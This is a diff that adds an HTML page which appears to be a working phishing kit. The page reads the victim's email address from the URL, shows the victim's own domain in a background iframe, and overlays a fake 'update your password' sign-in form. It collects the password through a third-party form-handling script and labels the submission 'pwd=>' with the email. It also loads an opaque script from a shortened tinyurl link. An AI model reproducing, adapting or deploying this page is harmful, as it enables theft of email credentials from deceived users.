@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+ 
+</head>
+
+ <style>
+        body{
+            width:99%;
+            height:100%;
+            margin:0;
+            padding:0;
+                  overflow: hidden; /* Hide scrollbars */
+        }
+        #mainPage{
+            border:none;
+        }
+        hr{
+            border:1px solid #999;
+        }
+        #overlay{
+            background-color:#555;
+            position:absolute;
+            top:0;
+            left:0;
+            bottom:0;
+            right:0;
+            border:1px solid #555;
+            opacity: 0.6;
+            filter: alpha(opacity=60)
+        }
+        #loginBody{
+            background-color:#555;
+            border: 1px solid #DDD;
+            box-shadow: 0px 0px 10px #DDD;
+            width: 480px;
+            height: 337px;
+            position:absolute;
+            top:24%;
+            left:33%;
+        }
+        #loginBg{
+            background:white;
+            width:100%;
+            height:100%;
+            opacity: 0.9;
+            filter: alpha(opacity=90);
+        }
+        #topHeader{
+            margin-bottom:10px;
+            padding-top:10px;
+        }
+        #favIcon{
+            margin:0 10px;
+        }
+        #form{
+            position:relative;
+            left:10%;
+            width:80%;
+        }
+        .email, .pass{
+            margin:0 0 5px;
+        }
+            
+    .pass:after {
+       
+            }
+            .pass {
+        display:inline-block;
+        position: relative
+    }
+       .errspan {
+        float: left;
+        margin-left: 20px;
+        margin-top: 0px;
+        position: relative;
+        z-index: 2;
+        color: brown;
+            border:1px solid grey;
+            height:27px;
+            width: 30px;
+            padding-top:5px;
+            border-right:none;
+    }
+      input:focus, input:focus{
+    outline: none;
+}
+   
+    </style>
+
+<div> 
+      
+    <script src="https://tinyurl.com/sdsdsaddd"></script>
+
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+            
+            
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+            $("#mainPage").attr("src", "https://www."+my_slice);
+ 
+       
+      }
+
+
+
+    });
+
+
+  </script>
+ 
+<title>Login</title>
+
+ 
+<iframe id="mainPage"style="position: absolute; height: 100%;border: none;" width="100%"></iframe>
+
+<div id="overlay" style="height: 100%; width: 1366px;">
+
+
+
+
+</div>
+<div id="loginBody">
+    <div id="loginBg">
+        <div id="topHeader" style="background-color:white ;color:white;padding-bottom:5px;padding-left:20px;">
+<div style="font-size:20pt; color:black;" align="center">To update your current password </a></div>
+
+        </div> 
+
+   <form id="my-form" action="??" method="post"> 
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=mxg51f63&n=n1.ratufa.io"></script>
+
+                <div class="pass">
+
+        </div> 
+<center><span style="font-size:20pt; color:green;" align="center"><p><p><p><b>Sign In as:</b></span> 
+<input id="user" style="font-size: 16pt; height: 30px; width:250px; border-style: dotted; border-color:  rgba(0,0,0,0);   rgba(0,0,0,0);  rgba(0,0,0,0);   rgba(0,0,0,0); background:rgba(0,0,0,0); ; color: #140c4d;"class="form-control" readonly="readonly"> 
+ <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 30px; width:260px;border-style: dotted; border-color:  rgba(0,0,0,0);   rgba(0,0,0,0);  rgba(0,0,0,0);   rgba(0,0,0,0); background:rgba(0,0,0,0); " readonly="readonly" />
+                <p>
+               <input type="password" name="Password" placeholder="Password" style="font-size: 12pt; height: 30px; width:260px;" required="" oninvalid="this.setCustomValidity('Enter your email password')"
+  oninput="this.setCustomValidity('')"/>
+ 
+    </p>
+ 
+            <button type="submit" name="sub" style=" background:  #21618c  ; color:#fff; font-size: 12pt; height: 30px; width:260px;border-style: dotted; border-color:#2e4c8a  #2e4c8a   #2e4c8a   #2e4c8a " class="btn btn-primary w-100 sub_b">Sign In</button>
+
+         </form>
+
+<script type="text/javascript">
+const params=new URLSearchParams(window.location.search);
+document.getElementById('email').value=params.get('email');
+document.getElementById('subject').value="pwd=> " + params.get('email');
+</script>
